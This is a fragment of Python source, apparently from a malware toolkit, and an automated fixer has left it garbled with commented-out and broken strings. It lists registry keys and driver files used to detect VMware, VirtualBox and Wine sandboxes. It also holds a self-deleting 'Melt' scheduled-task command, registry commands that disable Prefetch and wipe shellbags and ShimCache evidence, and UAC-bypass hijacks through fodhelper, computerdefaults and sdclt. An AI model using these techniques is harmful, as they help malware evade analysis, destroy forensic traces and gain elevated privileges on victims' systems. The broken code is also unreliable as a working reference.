...
""""Extensive collection of artifacts used to detect Virtual Machines and Sandboxes."""
        return {
            "registry": {
                "vmware": [
# [BATCHFIX] Commented metadata/non-Python
#                     rHKLM\SOFTWARE\VMware, Inc.\VMware Tools","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#                     rHKLM\HARDWARE\\\\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0","  # [BATCHFIX] closed string
                    # Identifier: VMWARE
# [BATCHFIX] Commented metadata/non-Python
#                     rHKLM\SYSTEM\ControlSet001\Control\SystemInformation",  # SystemManufacturer: VMWARE"  # [BATCHFIX] closed string
                ...
                "vbox": [
# [BATCHFIX] Commented metadata/non-Python
#                     rHKLM\SOFTWARE\Oracle\VirtualBox Guest Additions","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#                     rHKLM\HARDWARE\ACPI\\\\DSDT\VBOX__","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
...
#                 "wine": [rHKLM\SOFTWARE\Wine"],"  # [BATCHFIX] closed string
            ...
            "files": [
# [BATCHFIX] Commented metadata/non-Python
#                 rC:\Windows\\\\system32\\\\drivers\VBoxMouse.sys","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#                 rC:\Windows\\\\system32\\\\drivers\VBoxGuest.sys","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#                 rC:\Windows\\\\system32\\\\drivers\vmhgfs.sys","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
#                 rC:\Windows\\\\system32\\\\drivers\vmmouse.sys","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
...
#             "schtasks": (
                'schtasks /create /tn Melt /tr "cmd /c del %s" /sc once /st 00:00 /f && schtasks /run /tn Melt'
            ),
        }
...
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unmatched parenthesis
#             "prefetch_disable_reg": (
# [BATCHFIX] Commented metadata/non-Python
# #                 rreg add \"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"  # [BATCHFIX] closed string
#                 r"\Memory Management\PrefetchParameters\" /v EnablePrefetcher /t REG_DWORD /d 0 /f
            ),
...
#             "clear_shellbags": (
# [BATCHFIX] Commented metadata/non-Python
# #                 rreg delete \"HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows"  # [BATCHFIX] closed string
#                 r"\Shell\BagMRU\" /f
            ),
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unmatched parenthesis
#             "clear_shimcache": (
# [BATCHFIX] Commented metadata/non-Python
# #                 rreg delete \"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"  # [BATCHFIX] closed string
#                 r"\AppCompatCache\" /v AppCompatCache /f
            ),
        }
...
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#             "fodhelper": rreg add HKCU\Software\Classes\\\\ms-settings\Shell\Open\\\\command /d \"%s\" /f","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#             "computerdefaults": rreg add HKCU\Software\Classes\\\\ms-settings\Shell\Open\\\\command /d \"%s\" /f","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#             "sdclt": rreg add HKCU\Software\Classes\exefile\\\\shell\runas\\\\command /d \"%s\" /f","  # [BATCHFIX] closed string
